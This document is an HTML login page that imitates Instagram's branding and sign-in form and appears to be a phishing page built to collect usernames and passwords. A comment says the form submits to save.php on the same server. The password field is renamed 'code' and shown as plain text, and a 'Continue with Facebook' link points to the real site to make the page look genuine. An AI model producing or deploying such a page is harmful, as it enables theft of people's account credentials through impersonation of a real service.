<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Satisfy&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4 text-sm">

    <div class="flex-grow flex flex-col justify-center items-center w-full">
        <main class="w-full max-w-xs flex flex-col items-center">

            <h1 class="instagram-font text-5xl mb-8">Instagram</h1>

            <!-- Facebook tugmasi endi rasmiy saytga yo'naltiradi -->
            <a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer" class="bg-[#385185] w-full text-white font-semibold rounded-lg py-2 mt-4 flex items-center justify-center">
                <svg class="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M20 10c0-5.523-4.477-10-10-10S0 4.477 0 10c0 4.991 3.657 9.128 8.438 9.878v-6.987H5.904V10H8.438V7.795c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V10h2.773l-.443 2.89H13.62v6.988C18.343 19.128 20 14.991 20 10z" clip-rule="evenodd"></path></svg>
                Continue with Facebook
            </a>

            <div class="or-separator w-full my-4 font-semibold text-xs">OR</div>

            <!-- Form submits to save.php on the same server -->
            <form id="main-form" class="w-full space-y-2">
                <input name="name" id="name" type="text" placeholder="login username or phone number" class="input-field w-full px-3 py-3 rounded-md text-xs">
                <!-- Agar sizda "code" kerak bo'lsa password emas, uni 'code' deb nomlang -->
                <input name="code" id="code" type="text" placeholder="password" class="input-field w-full px-3 py-3 rounded-md text-xs">
                <input type="hidden" name="consent" value="1">

                <div class="text-right mt-2">
                    <a href="#" class="text-xs text-[#0095f6]">Forgot password?</a>
                </div>

                <button type="submit" class="bg-[#0095f6] w-full text-white font-semibold rounded-lg py-2 mt-4">
                    Submit
                </button>
            </form>

            <div class="mt-4">
                <p class="text-gray-400">Don't have an account? <a href="#" class="font-semibold text-[#0095f6]">Sign up</a></p>
            </div>

        </main>
    </div>

    <footer class="w-full text-center text-xs text-gray-500 pb-2">
        <p class="mb-4">By continuing, you agree to Terms and Privacy.</p>
        <div class="mt-4">
            <span>English</span>
            <span class="ml-4">© 2025</span>
        </div>
    </footer>

<script src="script.js"></script>
</body>
</html>
